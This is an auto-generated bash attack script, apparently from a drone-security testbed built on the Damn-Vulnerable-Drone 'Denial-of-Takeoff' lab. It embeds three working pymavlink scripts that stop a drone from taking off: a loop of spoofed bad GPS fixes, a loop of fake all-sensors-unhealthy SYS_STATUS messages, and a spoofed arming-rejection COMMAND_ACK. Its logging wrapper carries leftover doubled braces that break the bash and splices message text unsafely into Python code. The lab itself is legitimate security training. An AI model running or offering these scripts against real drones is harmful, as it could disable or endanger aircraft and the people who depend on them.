#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Denial-of-Takeoff.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition & Logging Setup
# ==========================================================
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../../../")

# MTD 타겟 조회
pushd "$PROJECT_ROOT" > /dev/null
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
POP_RESULT=$?
popd > /dev/null

if [ $POP_RESULT -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

TARGET_IP=$(echo $TARGET_ADDR | cut -d: -f1)
TARGET_PORT=$(echo $TARGET_ADDR | cut -d: -f2)

# 중앙 로거 함수 정의 (정확한 타임스탬프를 위해 쉘의 log 함수와 통합)
log() {{
    # 쉘 표준 로그 출력
    printf '[%(%F_%T)T] %s\n' -1 "$*"

    # bus.log에 JSON 이벤트 로깅
    EVENT_TYPE=$1
    shift
    EVENT_DATA_STR="$*"
    pushd "$PROJECT_ROOT" > /dev/null
    python3 -c "from dvd_lite.dvd_attacks_lpc.bus.logger import log_bus_event; log_bus_event('$EVENT_TYPE', {{'message': '$EVENT_DATA_STR'}})"
    popd > /dev/null
}}
# MTD_INTERFACE_END
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
fi

log "[ATTACK] id=denial-of-takeoff src=Denial-of-Takeoff.md"
log "[BLOCK 1] type=python"
python3 - "${TARGET_IP}:${TARGET_PORT}" <<PY
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
# gps_glitch_injection.py

from pymavlink import mavutil
import time
import sys

def main(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected to drone. Sending bad GPS data...")

    while True:
        master.mav.gps_raw_int_send(
            time_usec=int(time.time() * 1e6),
            fix_type=1,  # No usable fix
            lat=0,
            lon=0,
            alt=0,
            eph=1000,
            epv=1000,
            vel=0,
            cog=0,
            satellites_visible=0
        )
        print("[!] Spoofed bad GPS fix sent")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python gps_glitch_injection.py <target_ip:port>")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    main(ip, int(port))
PY

log "[BLOCK 2] type=python"
python3 - "${TARGET_IP}:${TARGET_PORT}" <<PY
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
# sys_status_corruption.py

from pymavlink import mavutil
import time
import sys

def main(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected to drone. Sending fake SYS_STATUS...")

    while True:
        master.mav.sys_status_send(
            onboard_control_sensors_present=0xFFFFFFFF,
            onboard_control_sensors_enabled=0xFFFFFFFF,
            onboard_control_sensors_health=0x00000000,
            load=500,
            voltage_battery=12000,
            current_battery=100,
            battery_remaining=90,
            drop_rate_comm=0,
            errors_comm=0,
            errors_count1=1,
            errors_count2=1,
            errors_count3=1,
            errors_count4=1
        )
        print("[!] Spoofed unhealthy SYS_STATUS sent")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python sys_status_corruption.py <target_ip:port>")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    main(ip, int(port))
PY

log "[BLOCK 3] type=python"
python3 - "${TARGET_IP}:${TARGET_PORT}" <<PY
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
# command_ack_block_arm.py

from pymavlink import mavutil
import sys

def main(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected. Sending spoofed COMMAND_ACK to block arming...")

    master.mav.command_ack_send(
        command=mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        result=mavutil.mavlink.MAV_RESULT_FAILED
    )
    print("[!] Spoofed arming rejection sent")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python command_ack_block_arm.py <target_ip:port>")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    main(ip, int(port))
PY

